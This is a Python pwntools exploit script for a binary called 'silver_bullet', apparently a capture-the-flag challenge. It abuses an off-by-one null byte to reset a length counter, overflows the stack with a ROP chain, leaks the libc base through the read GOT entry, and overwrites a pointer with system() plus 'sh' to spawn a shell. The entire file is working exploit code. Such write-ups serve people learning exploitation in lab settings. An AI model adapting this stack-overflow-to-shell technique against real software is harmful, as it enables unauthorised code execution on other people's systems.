from pwn import *

libc = ELF('libc_32.so.6')
silver_bullet = ELF('silver_bullet')


SYSTEM_PTR = 0x0804b00c
SH_PTR = SYSTEM_PTR + 4


class Prompts:
    CHOICE = 'Your choice :'
    BULLET_DESCRIPTION = 'Give me your description of bullet :'
    ANOTHER_BULLET_DESCRIPTION = 'Give me your another description of bullet :'
    WIN = 'You win !!\n'


class Choices:
    CREATE_BULLET = '1'
    POWER_UP = '2'
    BEAT = '3'
    EXIT = '4'


def set_initial_power():
    print('[*] Setting initial power to max power - 1.')
    p.sendafter(Prompts.CHOICE, Choices.CREATE_BULLET)
    p.sendafter(Prompts.BULLET_DESCRIPTION, 'A' * 0x2f)


def reset_power():
    print('[*] Powering up by 1 so that the terminating nullbyte overwrites the power.')
    p.sendafter(Prompts.CHOICE, Choices.POWER_UP)
    p.sendafter(Prompts.ANOTHER_BULLET_DESCRIPTION, 'A' * 0x1)
    print('[*] Power is equal to 1 while the description buffer is full.')


def overflow_stack():
    power = 0xffffffff
    chain = rop.ROP(silver_bullet)

    chain.puts(silver_bullet.got['read'])
    # 4 bytes for the address, 2 bytes for 'sh'
    chain.read_input(SYSTEM_PTR, 0x06)

    print('[*] Setting power to beat Gin.')
    print('[*] Placing the chain on the stack.')
    payload = p32(power) + b'AAA' + chain.chain()
    p.sendafter(Prompts.CHOICE, Choices.POWER_UP)
    p.sendafter(Prompts.ANOTHER_BULLET_DESCRIPTION, payload)


def beat():
    p.sendafter(Prompts.CHOICE, Choices.BEAT)
    p.recvuntil(Prompts.WIN)
    libc_base_addr = u32(p.recv(4)) - libc.sym['read']
    print(f'[*] libc base address: {hex(libc_base_addr)}')
    p.send(p32(libc_base_addr + libc.sym['system']) + b'sh')


p = gdb.debug(
    silver_bullet.path,
    '''
    # b *main+0x5b
    # b *main+0x69
    b *main+0x7b
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


def main():
    set_initial_power()
    reset_power()
    overflow_stack()
    beat()


if __name__ == "__main__":
    main()
